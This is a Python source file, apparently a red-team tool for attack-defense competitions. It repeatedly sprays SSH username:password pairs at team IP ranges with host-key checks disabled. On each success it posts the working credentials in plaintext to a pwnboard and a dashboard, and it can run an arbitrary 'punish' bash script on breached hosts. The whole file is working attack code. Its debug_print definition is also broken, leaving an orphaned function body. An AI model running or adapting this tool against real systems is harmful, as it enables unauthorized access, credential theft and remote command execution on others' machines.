import argparse
import subprocess
import requests
from pathlib import Path
import concurrent.futures
import time

def parse_arguments():
    parser = argparse.ArgumentParser(description="SSH Attempt Script")
    parser.add_argument("-m", "--mode", type=str, choices=['single', 'multiple', 'host_across_teams'], default="multiple",
                        help="Mode of operation: 'single', 'multiple', or 'host_across_teams'. Default is 'multiple'.")
    parser.add_argument("-t", "--team_number", type=int, default=5,
                        help="Specify the team number for single team mode check. Used only if mode is 'single'. Default is '5'.")
    parser.add_argument("-n", "--num_teams", type=int, default=10,
                        help="Number of teams to operate on. Used only if mode is 'multiple' or 'host_across_teams'.")
    parser.add_argument("-p", "--pwnboard_host", type=str, default="https://127.0.0.1/pwn/boxaccess",
                        help="Target URL for the pwnboard. Default is 'https://127.0.0.1/pwn/boxaccess'.")
    parser.add_argument("-f", "--ip_file_path", type=str, required=True,
                        help="Path to the file containing IP addresses.")
    parser.add_argument("-c", "--creds_file", type=str, required=True,
                        help="Path to the file containing credentials in 'username:password' format.")
    parser.add_argument("--demo", action="store_true",
                        help="Enable demo mode to simulate SSH checks without actual connection attempts. Used for checking pwnboard/webapp")
    parser.add_argument("--dashboard_url", type=str, required=True, default="https://127.0.0.1:5000",
                        help="URL to the Flask web application for posting valid credentials., Default is 127.0.0.1:5000")
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug messages.")
    parser.add_argument("--use_proxychains", action="store_true",
                        help="Use proxychains for SSH attempts. Default is False.")
    parser.add_argument("--punish", type=str, help="Path to the bash script to execute on successful SSH. Default is None.", default=None)

    epilog_text = ("Examples of use:\n\n"
                   "  Run in single mode for team 5: \n"
                   "    python script_name.py -m single -t 5 -f ips.txt -c creds.txt --dashboard_url http://dashboard.url\n\n"
                   "  Run across multiple teams in host_across_teams mode: \n"
                   "    python script_name.py -m host_across_teams -n 10 -f ips.txt -c creds.txt --dashboard_url http://dashboard.url\n")
    parser.epilog = epilog_text

    return parser.parse_args()


    if globals().get("DEBUG_MODE", False):
        print(*args, **kwargs)

def ssh_attempt(ip, user, password, pwn_host, dashboard_url, team, demo=False, use_proxychains=False, punish_script=None):
    try:
        if demo:
            debug_print(f"Demo mode: ✅  {ip} - {user}")
            time.sleep(1)  # Simulate some delay
            result_code = 0
        else:
            ssh_command = ["sshpass", "-p", password, "ssh", "-o", "ConnectTimeout=1", "-o", "UserKnownHostsFile=/dev/null", "-o", "StrictHostKeyChecking=no", f"{user}@{ip}", "true"]
            if use_proxychains:
                ssh_command = ["proxychains", *ssh_command]
            result = subprocess.run(ssh_command, capture_output=True)
            result_code = result.returncode
            debug_print(result.stderr.decode())

        if result_code == 0:
            debug_print(f"✅  {ip} - {user} with {password}")
            pwboard_callback(ip, pwn_host)
            post_to_webapp(ip, user, password, dashboard_url, team)
            if punish_script:
                punish_command = ["sshpass", "-p", password, "ssh", "-o", "ConnectTimeout=1", "-o", "UserKnownHostsFile=/dev/null", "-o", "StrictHostKeyChecking=no", f"{user}@{ip}", f"bash -s < {punish_script}"]
                if use_proxychains:
                    punish_command = ["proxychains", *punish_command]
                subprocess.run(punish_command, capture_output=True)
    except Exception as e:
        debug_print(f"Error in ssh_attempt for {ip}: {e}")

def pwboard_callback(target, pwn_host):
    try:
        data = {"ip": target, "type": "bash"}
        response = requests.post(pwn_host, json=data)
        
        if response.status_code == 200:
            debug_print(f"Successfully posted to pwnboard: {target}")
        else:
            debug_print(f"Failed to post to pwnboard: {target} - Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        debug_print(f"Error in pwboard_callback for {target}: {e}")

def post_to_webapp(ip, user, password, dashboard_url, team):
    try:
        data = {"team": team, "ip": ip, "user": user, "password": password}
        response = requests.post(f"{dashboard_url}/api/update_creds", json=data)
        if response.status_code == 200:
            debug_print(f"Posted to webapp: {ip}")
        else:
            debug_print(f"Failed to post to webapp: {ip} - Status code: {response.status_code} - {response}")
    except Exception as e:
        debug_print(f"Error in post_to_webapp for {ip}: {e}")

def load_credentials(creds_file_path):
    credentials = []
    try:
        with open(creds_file_path, 'r') as file:
            for line in file:
                user, password = line.strip().split(':')
                credentials.append((user, password))
    except Exception as e:
        debug_print(f"Error loading credentials: {e}")
    return credentials

def replace_ip_placeholder(ip_template, team_number):
    return ip_template.replace('X', str(team_number))

def run_checks_for_team(ip_templates, team_number, credentials, args):
    try:
        ips = [replace_ip_placeholder(ip_template, team_number) for ip_template in ip_templates]
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = [executor.submit(ssh_attempt, ip, user, password, args.pwnboard_host, args.dashboard_url, team_number, args.demo, args.use_proxychains, args.punish) for ip in ips for user, password in credentials]
            concurrent.futures.wait(futures)
    except Exception as e:
        debug_print(f"Error in run_checks_for_team for team {team_number}: {e}")

def clear_credentials_on_board(dashboard_url):
    try:
        debug_print("Attempting to clear credentials on the board...")
        response = requests.post(f"{dashboard_url}/api/clear_creds")
        if response.status_code == 200:
            debug_print("Credentials cleared on the board successfully.")
        else:
            debug_print(f"Failed to clear credentials on the board. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        debug_print(f"Error clearing credentials on the board: {e}")

def main():
    try:
        args = parse_arguments()
        globals()["DEBUG_MODE"] = args.debug
        if not Path(args.ip_file_path).is_file() or not Path(args.creds_file).is_file():
            debug_print("IP file or credentials file does not exist.")
            return

        credentials = load_credentials(args.creds_file)

        with open(args.ip_file_path, 'r') as file:
            ip_templates = file.read().splitlines()

        while True:
            if args.mode == 'single':
                run_checks_for_team(ip_templates, args.team_number, credentials, args)
            elif args.mode in ['multiple', 'host_across_teams']:
                for team_number in range(1, args.num_teams + 1):
                    run_checks_for_team(ip_templates, team_number, credentials, args)
            clear_credentials_on_board(args.dashboard_url)
            debug_print("Completed a pass over all teams. Restarting...")
    except Exception as e:
        debug_print(f"Unexpected error in main: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        debug_print("\nScript stopped by user.")
